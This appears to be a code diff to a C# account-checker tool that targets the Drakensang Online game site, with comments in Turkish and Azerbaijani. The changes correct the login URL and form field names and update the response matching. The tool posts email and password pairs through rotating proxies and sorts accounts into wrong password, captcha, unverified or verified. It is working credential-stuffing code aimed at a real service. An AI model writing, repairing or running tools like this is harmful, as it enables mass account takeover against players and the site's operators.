@@ -15,9 +15,10 @@ namespace CheckerDSO.Services
         private int _proxyIndex = 0;
         private readonly object _proxyLock = new object();
 
-        // Varsayılan DSO Login Endpoint - test edilmeli/değiştirilebilir olmalı
-        private const string LoginUrl = "https://www.drakensang.com/api/user/login"; 
-        private const string ManageUrl = "https://www.drakensang.com/account/manage";
+        // 1-Cİ ƏSAS DÜZƏLİŞ: Login url-i api deyil, birbaşa /en/login olmalıdır!
+        private const string LoginUrl = "https://www.drakensang.com/en/login";
+        // Yönləndirmə linki (Manage Account)
+        private const string ManageUrl = "https://www.drakensang.com/en/account";
 
         public CheckerService(List<ProxyEntry> proxies)
         {
@@ -44,58 +45,62 @@ namespace CheckerDSO.Services
             account.Notes = "Connecting...";
 
             var proxy = GetNextProxy();
-            
+
             try
             {
                 using var client = HttpService.CreateClient(proxy);
 
-                // 1. POST Login
+                // 2-Cİ ƏSAS DÜZƏLİŞ: Saytın arxa planda qəbul etdiyi əsl form adları
                 var content = new FormUrlEncodedContent(new[]
                 {
-                    new KeyValuePair<string, string>("email", account.Email),
-                    new KeyValuePair<string, string>("password", account.Password)
+                    new KeyValuePair<string, string>("loginForm[user]", account.Email),
+                    new KeyValuePair<string, string>("loginForm[password]", account.Password)
                 });
 
                 account.Notes = "Logging in...";
                 var loginResponse = await client.PostAsync(LoginUrl, content, token);
                 var loginContent = await loginResponse.Content.ReadAsStringAsync(token);
 
-                if (loginContent.Contains("wrong password") || loginContent.Contains("invalid credentials"))
+                // Bütün mətni kiçik hərfə çeviririk ki, axtarış dəqiq olsun
+                string loginLower = loginContent.ToLower();
+
+                // 1.1 Səhv Şifrəni yoxlayırıq (Real saytın mesajı ilə)
+                if (loginLower.Contains("no account with this username/password") ||
+                    loginLower.Contains("invalid credentials"))
                 {
                     account.Status = AccountStatus.WrongPass;
                     account.Notes = "Wrong Password";
                     return;
                 }
-                
-                if (loginContent.Contains("captcha") || loginContent.Contains("g-recaptcha"))
+
+                // 1.2 Captcha-nı yoxlayırıq
+                if (loginLower.Contains("prove you are human") || loginLower.Contains("captcha-required"))
                 {
                     account.Status = AccountStatus.Captcha;
                     account.Notes = "Captcha detected";
                     return;
                 }
 
-                // 2. GET Manage Account
+                // 2. GET Manage Account (Bizi avtomatik bpsecure səhifəsinə yönləndirəcək)
                 account.Notes = "Checking email status...";
                 var manageResponse = await client.GetAsync(ManageUrl, token);
                 var manageHtml = await manageResponse.Content.ReadAsStringAsync(token);
 
-                var doc = new HtmlDocument();
-                doc.LoadHtml(manageHtml);
-
-                // TODO: Gerçek DSO HTML yapısına göre bu kelimeler güncellenmeli
                 string htmlLower = manageHtml.ToLower();
-                if (htmlLower.Contains("confirm your email") || 
-                    htmlLower.Contains("verify-email") || 
-                    htmlLower.Contains("resend-verification"))
+
+                // 3. Statusun Yoxlanması (Real bpsecure.com mətnlərinə əsasən)
+                if (htmlLower.Contains("confirm e-mail address") ||
+                    htmlLower.Contains("complete 2 steps") ||
+                    htmlLower.Contains("check if the e-mail address provided is correct"))
                 {
                     account.Status = AccountStatus.Unverified;
-                    account.Notes = "Email Unverified";
+                    account.Notes = "Email Unverified"; // Doğrulanmamış hesablar (Sarı)
                 }
                 else
                 {
-                    // Eğer confirm butonları yoksa verified varsayıyoruz
+                    // Əgər o yazılar yoxdursa, deməli təsdiqlənib
                     account.Status = AccountStatus.Verified;
-                    account.Notes = "Email Verified";
+                    account.Notes = "Email Verified"; // Təsdiqlənmiş hesablar (Yaşıl)
                 }
             }
             catch (TaskCanceledException)
